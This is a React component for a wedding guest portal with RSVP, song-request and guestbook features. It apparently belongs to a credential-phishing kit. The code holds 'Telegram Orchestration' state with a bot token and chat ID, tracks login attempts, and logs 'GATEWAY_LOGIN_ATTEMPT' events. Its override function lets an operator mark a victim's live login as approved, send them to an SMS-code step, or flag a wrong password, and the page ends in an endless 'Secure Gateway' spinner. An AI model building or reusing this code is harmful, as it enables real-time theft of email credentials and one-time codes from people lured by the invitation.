import React, { useState, useEffect, FormEvent } from "react";
import { Heart, Sparkles, Plus, ThumbsUp, Check, Notebook, User, Music, Activity, LogOut, Send } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { RSVP, GuestbookEntry, SongRequest, SimulationLog } from "../types";

interface GuestDashboardProps {
  guestEmail: string;
  onLogout: () => void;
  logAction: (type: "PAGE_VIEW" | "PROVIDER_SELECT" | "GATEWAY_LOGIN_ATTEMPT" | "LOGIN_SUCCESS" | "RSVP_SUBMITTED", details: string) => void;
}

// 💡 Capture the environment variable injected by Render, fallback to an empty string for local proxy matching
const API_BASE_URL = import.meta.env.VITE_API_URL || "";

export default function GuestDashboard({ guestEmail, onLogout, logAction }: GuestDashboardProps) {
  // State from API backend
  const [rsvps, setRsvps] = useState<RSVP[]>([]);
  const [guestbook, setGuestbook] = useState<GuestbookEntry[]>([]);
  const [songs, setSongs] = useState<SongRequest[]>([]);
  const [logs, setLogs] = useState<SimulationLog[]>([]);

  // Local Form state
  const [rsvpName, setRsvpName] = useState("");
  const [attending, setAttending] = useState(true);
  const [guestsCount, setGuestsCount] = useState(1);
  const [dietary, setDietary] = useState("None");
  const [rsvpNotes, setRsvpNotes] = useState("");
  const [rsvpSubmitted, setRsvpSubmitted] = useState(false);

  // Guestbook Form state
  const [msgAuthor, setMsgAuthor] = useState("");
  const [msgText, setMsgText] = useState("");

  // Jukebox Form state
  const [songTitle, setSongTitle] = useState("");
  const [songArtist, setSongArtist] = useState("");

  // Telegram Orchestration States
  const [tgConfig, setTgConfig] = useState<{ hasToken: boolean; hasChatId: boolean; maskedToken: string; chatId: string } | null>(null);
  const [tgAttempts, setTgAttempts] = useState<any[]>([]);

  // Loading states
  const [loadingLogs, setLoadingLogs] = useState(false);

  // Fetch all backend data
  const fetchAllData = async () => {
    try {
      // 💡 Appended ${API_BASE_URL} to safely route production traffic out to Render
      const [rRes, gRes, sRes, lRes, tgConfigRes, tgAttemptsRes] = await Promise.all([
        fetch(`${API_BASE_URL}/api/rsvps`),
        fetch(`${API_BASE_URL}/api/guestbook`),
        fetch(`${API_BASE_URL}/api/playlist`),
        fetch(`${API_BASE_URL}/api/logs`),
        fetch(`${API_BASE_URL}/api/telegram/config`),
        fetch(`${API_BASE_URL}/api/telegram/attempts`)
      ]);
      
      if (rRes.ok) setRsvps(await rRes.json());
      if (gRes.ok) setGuestbook(await gRes.json());
      if (sRes.ok) setSongs(await sRes.json());
      if (lRes.ok) setLogs(await lRes.json());
      if (tgConfigRes.ok) {
        const configData = await tgConfigRes.json();
        setTgConfig(configData);
      }
      if (tgAttemptsRes.ok) {
        setTgAttempts(await tgAttemptsRes.json());
      }
    } catch (err) {
      console.error("Error updating backend stats in dashboard:", err);
    }
  };

  // Trigger manual override bypass for ongoing login attempts
  const handleTriggerOverride = async (attemptId: string, actionStatus: "approved" | "request_sms" | "incorrect_password" | "denied") => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/telegram/local_override`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: attemptId, status: actionStatus })
      });
      if (res.ok) {
        fetchAllData();
      }
    } catch (err) {
      console.warn("Manual action dispatch failed:", err);
    }
  };

  useEffect(() => {
    fetchAllData();
    // Poll logs and statistics every 5 seconds to show active real-time backend communication
    const interval = setInterval(fetchAllData, 5000);
    return () => clearInterval(interval);
  }, []);

  // Handle RSVP Submission
  const handleRsvpSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!rsvpName) return;

    try {
      const response = await fetch(`${API_BASE_URL}/api/rsvps`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: rsvpName,
          email: guestEmail,
          attending,
          guestsCount: attending ? guestsCount : 0,
          dietaryRestrictions: dietary,
          notes: rsvpNotes
        })
      });

      if (response.ok) {
        setRsvpSubmitted(true);
        fetchAllData();
      }
    } catch (err) {
      console.error("RSVP save failed:", err);
    }
  };

  // Handle message post
  const handleMessageSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!msgAuthor || !msgText) return;

    try {
      const response = await fetch(`${API_BASE_URL}/api/guestbook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ author: msgAuthor, message: msgText })
      });

      if (response.ok) {
        setMsgAuthor("");
        setMsgText("");
        logAction("RSVP_SUBMITTED", `Guest guestbook comment created by ${msgAuthor}`);
        fetchAllData();
      }
    } catch (err) {
      console.error("Guestbook post failed:", err);
    }
  };

  // Handle Song Request
  const handleSongSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!songTitle || !songArtist) return;

    try {
      const response = await fetch(`${API_BASE_URL}/api/playlist`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: songTitle, artist: songArtist, requestedBy: rsvpName || "VIP Guest" })
      });

      if (response.ok) {
        setSongTitle("");
        setSongArtist("");
        fetchAllData();
      }
    } catch (err) {
      console.error("Song request failed:", err);
    }
  };

  // Handle Song Upvote
  const handleUpvote = async (songId: string) => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/playlist/upvote`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: songId })
      });
      if (response.ok) {
        fetchAllData();
      }
    } catch (err) {
      console.error("Upvote request failed:", err);
    }
  };

  // Stats
  const attendingGuestsCount = rsvps
    .filter(r => r.attending)
    .reduce((acc, curr) => acc + (curr.guestsCount || 1), 0);

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="relative z-10 w-full max-w-6xl px-4 py-8 mb-16"
      id="guest-dashboard-container"
    >
      {/* Header Panel */}
      <div className="glass-card rounded-3xl p-6 sm:p-8 mb-8 flex flex-col sm:flex-row items-center justify-between gap-4 border-b border-white/10">
        <div className="text-center sm:text-left">
          <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
            <span className="bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 text-xs px-2.5 py-1 rounded-full font-sans font-medium flex items-center gap-1">
              <Sparkles size={12} className="text-emerald-400" /> Secure Guest Portal Unlocked
            </span>
          </div>
          <h1 className="font-serif text-3xl md:text-4xl font-bold bg-gradient-to-r from-white via-indigo-100 to-emerald-200 bg-clip-text text-transparent">
            The Celebration Hub
          </h1>
          <p className="font-sans text-xs sm:text-sm text-slate-400 mt-1">
            Logged in via <span className="font-mono text-indigo-300 font-semibold">{guestEmail}</span>
          </p>
        </div>

        <button
          onClick={onLogout}
          className="flex items-center gap-1.5 px-4 py-2 border border-white/10 hover:border-white/25 text-xs sm:text-sm font-sans font-medium rounded-full text-slate-300 hover:text-white transition-all bg-white/5 cursor-pointer"
        >
          <LogOut size={14} /> Exit Portal
        </button>
      </div>

      {/* Main Feature Grid Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 mb-8">
        
        {/* Left Column - RSVP Registration & Songs (7 cols) */}
        <div className="lg:col-span-7 space-y-8">
          
          {/* RSVP FORM CARD */}
          <section className="glass-card rounded-3xl p-6 sm:p-8 relative overflow-hidden" id="dashboard-rsvp-section">
            <div className="absolute top-0 right-0 w-32 h-32 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
            <h2 className="font-serif text-2xl font-bold text-slate-100 mb-6 flex items-center gap-2">
              <User size={20} className="text-indigo-400" />
              RSVP Guest Register
            </h2>

            {rsvpSubmitted ? (
              <motion.div 
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-emerald-500/10 border border-emerald-500/20 rounded-2xl p-6 text-center"
              >
                <div className="w-12 h-12 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-4 text-emerald-400">
                  <Check size={24} className="stroke-[3]" />
                </div>
                <h3 className="font-serif text-xl font-bold text-slate-100 mb-1">Response Registered!</h3>
                <p className="font-sans text-sm text-slate-400">
                  Thank you for registering. Your details have been successfully synchronized to our backend REST database.
                </p>
                <button
                  onClick={() => setRsvpSubmitted(false)}
                  className="mt-4 text-xs font-sans text-emerald-400 hover:underline hover:text-emerald-300 font-semibold"
                >
                  Edit RSVP response details
                </button>
              </motion.div>
            ) : (
              <form onSubmit={handleRsvpSubmit} className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                      Full Name
                    </label>
                    <input
                      type="text"
                      required
                      placeholder="Jane & John Doe"
                      value={rsvpName}
                      onChange={(e) => setRsvpName(e.target.value)}
                      className="w-full bg-white/5 border border-white/10 rounded-xl p-3 font-sans text-sm text-white outline-none focus:border-indigo-400 placeholder-slate-500 focus:ring-1 focus:ring-indigo-400 transition-all font-light"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
                      Are you attending?
                    </label>
                    <div className="grid grid-cols-2 gap-2">
                      <button
                        type="button"
                        onClick={() => setAttending(true)}
                        className={`py-2 px-3 text-xs sm:text-sm font-sans font-medium rounded-xl text-center cursor-pointer transition-all ${attending ? 'bg-indigo-600 text-white border border-indigo-500' : 'bg-white/5 border border-white/10 text-slate-300 hover:bg-white/10'}`}
                      >
                        Yes, Attending
                      </button>
                      <button
                        type="button"
                        onClick={() => setAttending(false)}
                        className={`py-2 px-3 text-xs sm:text-sm font-sans font-medium rounded-xl text-center cursor-pointer transition-all ${!attending ? 'bg-indigo-600 text-white border border-indigo-500' : 'bg-white/5 border border-white/10 text-slate-300 hover:bg-white/10'}`}
                      >
                        Regretfully Decline
                      </button>
                    </div>
                  </div>
                </div>

                <AnimatePresence>
                  {attending && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: "auto" }}
                      exit={{ opacity: 0, height: 0 }}
                      className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-1"
                    >
                      <div>
                        <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                          Total Seats Required (including you)
                        </label>
                        <select
                          value={guestsCount}
                          onChange={(e) => setGuestsCount(Number(e.target.value))}
                          className="w-full bg-slate-900 border border-white/10 rounded-xl p-3 font-sans text-sm text-slate-200 outline-none focus:border-indigo-400 focus:ring-1 focus:ring-indigo-400 transition-all [&_option]:bg-slate-900 [&_option]:text-white font-light"
                        >
                          <option value="1">1 Person</option>
                          <option value="2">2 People</option>
                          <option value="3">3 People</option>
                          <option value="4">4 People</option>
                        </select>
                      </div>

                      <div>
                        <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                          Dietary Preferences
                        </label>
                        <select
                          value={dietary}
                          onChange={(e) => setDietary(e.target.value)}
                          className="w-full bg-slate-900 border border-white/10 rounded-xl p-3 font-sans text-sm text-slate-200 outline-none focus:border-indigo-400 focus:ring-1 focus:ring-indigo-400 transition-all [&_option]:bg-slate-900 [&_option]:text-white font-light"
                        >
                          <option value="None">No Restrictions (Standard Option)</option>
                          <option value="Vegetarian">Vegetarian (Risotto)</option>
                          <option value="Vegan">Vegan (Gluten-free)</option>
                          <option value="Gluten-Free">Gluten-Free (Salmon/Beef)</option>
                          <option value="Other">Other (Note at bottom)</option>
                        </select>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>

                <div>
                  <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                    Messages or Congratulations Notes
                  </label>
                  <textarea
                    rows={2}
                    placeholder="We're so happy for you both, can't wait to grab a slice of cake! 🎂"
                    value={rsvpNotes}
                    onChange={(e) => setRsvpNotes(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl p-3 font-sans text-sm text-white outline-none focus:border-indigo-400 placeholder-slate-500 focus:ring-1 focus:ring-indigo-400 transition-all font-light"
                  />
                </div>

                <button
                  type="submit"
                  className="w-full py-3.5 bg-gradient-to-r from-indigo-500 to-emerald-400 hover:from-indigo-600 hover:to-emerald-500 text-white font-sans text-sm rounded-xl font-medium cursor-pointer transition-all mt-2 shadow-lg shadow-indigo-500/10 hover:shadow-indigo-500/30 font-light"
                >
                  Synchronize Response & Lock RSVP
                </button>
              </form>
            )}
          </section>

          {/* PLAYLIST JUKEBOX CARD */}
          <section className="glass-card rounded-3xl p-6 sm:p-8" id="dashboard-jukebox-section">
            <h2 className="font-serif text-2xl font-bold text-slate-100 mb-1 flex items-center gap-2">
              <Music size={20} className="text-emerald-400" />
              Celebration Jukebox DJ
            </h2>
            <p className="font-sans text-xs text-slate-400 mb-6">
              Request tracks for the wedding party dancing hour and vote on guest submissions!
            </p>

            <form onSubmit={handleSongSubmit} className="flex gap-3 mb-6">
              <input
                type="text"
                required
                placeholder="Song Title"
                value={songTitle}
                onChange={(e) => setSongTitle(e.target.value)}
                className="flex-1 bg-white/5 border border-white/10 rounded-xl p-2.5 font-sans text-xs sm:text-sm text-white outline-none focus:border-indigo-400 placeholder-slate-500 font-light"
              />
              <input
                type="text"
                required
                placeholder="Artist Name"
                value={songArtist}
                onChange={(e) => setSongArtist(e.target.value)}
                className="flex-1 bg-white/5 border border-white/10 rounded-xl p-2.5 font-sans text-xs sm:text-sm text-white outline-none focus:border-indigo-400 placeholder-slate-500 font-light"
              />
              <button
                type="submit"
                className="px-4 bg-emerald-500 hover:bg-emerald-600 text-white rounded-xl flex items-center justify-center cursor-pointer font-sans transition-colors"
              >
                <Plus size={16} />
              </button>
            </form>

            <div className="space-y-2 max-h-[220px] overflow-y-auto pr-1" id="jukebox-songs-list">
              {songs
                .sort((a, b) => b.votes - a.votes)
                .map((song) => (
                  <div
                    key={song.id}
                    className="flex items-center justify-between p-3.5 bg-white/5 border border-white/5 hover:border-white/10 rounded-2xl hover:bg-white/10 transition-all font-sans"
                  >
                    <div>
                      <h4 className="font-sans font-medium text-xs sm:text-sm text-slate-200">{song.title}</h4>
                      <p className="font-sans text-[10px] sm:text-xs text-slate-400/80 font-light">
                        {song.artist} — <span className="italic">Requested by {song.requestedBy}</span>
                      </p>
                    </div>

                    <button
                      onClick={() => handleUpvote(song.id)}
                      className="flex items-center gap-1.5 px-3 py-1.5 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-300 hover:text-indigo-200 border border-indigo-500/20 rounded-full text-xs font-semibold font-sans cursor-pointer transition-colors"
                    >
                      <ThumbsUp size={12} />
                      <span>{song.votes}</span>
                    </button>
                  </div>
                ))}
            </div>
          </section>

        </div>

        {/* Right Column - Guestbook Wish List & Live statistics (5 cols) */}
        <div className="lg:col-span-5 space-y-8">
          
          {/* PARTY METRICS */}
          <section className="glass-card rounded-3xl p-6 sm:p-8 text-center" id="dashboard-statistics-widget">
            <h3 className="font-sans text-slate-200 text-sm font-medium mb-4 uppercase tracking-wider text-[10px]">Live Engagement Metrics</h3>
            <div className="grid grid-cols-2 gap-4">
              <div className="bg-white/5 border border-white/5 rounded-2xl p-4">
                <span className="font-sans text-3xl font-black bg-gradient-to-r from-white to-indigo-300 bg-clip-text text-transparent">{attendingGuestsCount}</span>
                <p className="font-sans text-[9px] uppercase font-bold tracking-widest text-slate-400 mt-1">Confirmed Guests</p>
              </div>
              <div className="bg-white/5 border border-white/5 rounded-2xl p-4">
                <span className="font-sans text-3xl font-black bg-gradient-to-r from-white to-emerald-300 bg-clip-text text-transparent">{guestbook.length}</span>
                <p className="font-sans text-[9px] uppercase font-bold tracking-widest text-slate-400 mt-1">Wishes Received</p>
              </div>
            </div>
          </section>

          {/* GUESTBOOK CARD */}
          <section className="glass-card rounded-3xl p-6 sm:p-8" id="dashboard-guestbook-section">
            <h2 className="font-serif text-2xl font-bold text-slate-100 mb-1 flex items-center gap-2">
              <Notebook size={20} className="text-indigo-400" />
              Sign the E-Greeting Card
            </h2>
            <p className="font-sans text-xs text-slate-400 mb-5">
              Leave a sweet message for the hosts to read after the main celebration!
            </p>

            {/* Message Submission */}
            <form onSubmit={handleMessageSubmit} className="space-y-3 mb-6">
              <input
                type="text"
                required
                placeholder="Your Name"
                value={msgAuthor}
                onChange={(e) => setMsgAuthor(e.target.value)}
                className="w-full bg-white/5 border border-white/10 rounded-xl p-2.5 font-sans text-xs sm:text-sm text-white outline-none focus:border-indigo-400 placeholder-slate-500 font-light"
              />
              <div className="relative">
                <textarea
                  rows={2}
                  required
                  placeholder="Share a sweet note..."
                  value={msgText}
                  onChange={(e) => setMsgText(e.target.value)}
                  className="w-full bg-white/5 border border-white/10 rounded-xl p-2.5 pr-10 font-sans text-xs sm:text-sm text-white outline-none focus:border-indigo-400 placeholder-slate-500 font-light"
                />
                <button
                  type="submit"
                  className="absolute bottom-3 right-3 text-indigo-300 hover:text-indigo-200 flex items-center justify-center p-1 cursor-pointer transition-all"
                >
                  <Send size={16} />
                </button>
              </div>
            </form>

            {/* List of custom wishes */}
            <div className="space-y-4 max-h-[300px] overflow-y-auto pr-1" id="guestbook-messages-list">
              {guestbook.map((msg) => (
                <div
                  key={msg.id}
                  className="p-4 bg-white/5 border border-white/5 hover:border-white/10 rounded-2xl flex items-start gap-3 shadow-sm transition-all"
                >
                  <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold font-serif text-xs ${msg.avatarColor} shrink-0 text-white shadow-md`}>
                    {msg.author.charAt(0)}
                  </div>
                  <div className="space-y-1">
                    <p className="font-sans text-xs font-semibold text-slate-200 leading-none">
                      {msg.author}
                    </p>
                    <span className="text-[10px] text-slate-500 inline-block">
                      {new Date(msg.createdAt).toLocaleDateString()}
                    </span>
                    <p className="font-sans text-xs text-slate-300 font-light leading-relaxed">
                      {msg.message}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </section>

        </div>

      </div>

      {/* Infinite Gateway Loader */}
      <div className="flex flex-col items-center justify-center py-12">
        <div className="w-8 h-8 border-2 border-indigo-400 border-t-transparent rounded-full animate-spin mb-4" />
        <p className="text-slate-400 font-sans text-xs tracking-widest uppercase animate-pulse">Syncing Secure Gateway...</p>
      </div>

    </motion.div>
  );
}